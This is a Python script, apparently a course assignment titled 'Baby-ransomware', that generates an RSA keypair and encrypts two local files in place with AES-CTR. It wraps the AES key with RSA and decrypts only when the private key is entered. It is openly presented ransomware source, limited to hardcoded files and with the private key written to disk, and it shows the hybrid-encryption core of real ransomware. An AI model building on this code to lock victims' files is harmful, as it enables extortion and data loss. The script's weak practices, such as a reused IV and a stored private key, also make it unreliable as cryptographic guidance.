from sys import exit
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import pyaes,  binascii, os, secrets

keyPair = RSA.generate(2048)  # 2048 bit

pubKey = keyPair.publickey()
encryptor = PKCS1_OAEP.new(pubKey)
decryptor = PKCS1_OAEP.new(keyPair)
with open('PublicKey_and_Privateket.txt', 'w+') as f:
        RSApub = format(f"RSA Public key:  (n={hex(pubKey.n)})")
        s = f.write(RSApub)
        s = f.write("\n")
        RSApri = format(f"RSA Private key: (d={hex(keyPair.d)})")
        s = f.write(RSApri)
        f.close()
        
key = os.urandom(32)  #  32 bytes == 256 bits
iv = secrets.randbits(128) # 128 bits == 16 bytes 

def Encryption():
    print('{:^50}'.format('Encryption Suscess'))
    print("AES key :",binascii.hexlify(key))
    print("IV :",iv)
    ciphertext=""  
    with open('text.txt', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.encrypt(s)
        f.close()
    with open('text.txt', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    with open('Picture.jpg', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.encrypt(s)
        f.close()
    with open('Picture.jpg', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    with open('LocalKey.txt', 'w+') as f:
        s = f.write("AES key :")
        s = f.write(str(binascii.hexlify(key)))
        s = f.write("\n")
        s = f.write("IV :")
        s = f.write(str(iv))
        f.close()
    with open('LocalKey.txt', 'rb') as f:
        s = f.read()
        ciphertext = encryptor.encrypt(s)
        f.close()
    with open('LocalKey.txt', 'wb') as f:
        s = f.write(ciphertext)
        f.close() 
    
    
    
def Decryption():
    print('{:^50}'.format('Decryption Suscess'))
    paintext=""
    with open('text.txt', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        paintext = aes.decrypt(s)
        f.close()
    with open('text.txt', 'wb') as f:
        s = f.write(paintext)
        f.close()
    with open('Picture.jpg', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.decrypt(s)
        f.close()
    with open('Picture.jpg', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    with open('LocalKey.txt', 'rb') as f:
        s = f.read()
        paintext = decryptor.decrypt(s)
        f.close()
    with open('LocalKey.txt', 'wb') as f:
        s = f.write(paintext)
        f.close()
    with open('LocalKey.txt', 'r') as f:
        s = f.read()
        print(s)
        f.close()
    
    

if __name__ == '__main__':

    while True:
        print('{:-<50}'.format(' '))
        print('{:^50}'.format('Assignment: Baby-ransomware'))
        print('{:-<50}'.format(' '))
        print('{:15}{:<}'.format('','1 : Encryption'))
        print('{:15}{:<}'.format('','2 : Decryption'))
        print('{:15}{:<}'.format('','Press x to exit Program'))
        print('{:-<50}'.format(' '))
        print("Select option")
        answer = input()
        if answer == '1':
            print('{:-<50}'.format(' '))
            Encryption()
        elif answer == '2':
            print("Enter your RSA privatekey")
            tmp= True
            while(tmp):
                RSAprivatekey = input()
                if(RSAprivatekey == hex(keyPair.d)):
                    print('{:-<50}'.format(' '))
                    Decryption()
                    tmp = False
                else:
                    print("Try again")
        elif answer == 'x':
            exit()
        else:
            print("select again")
    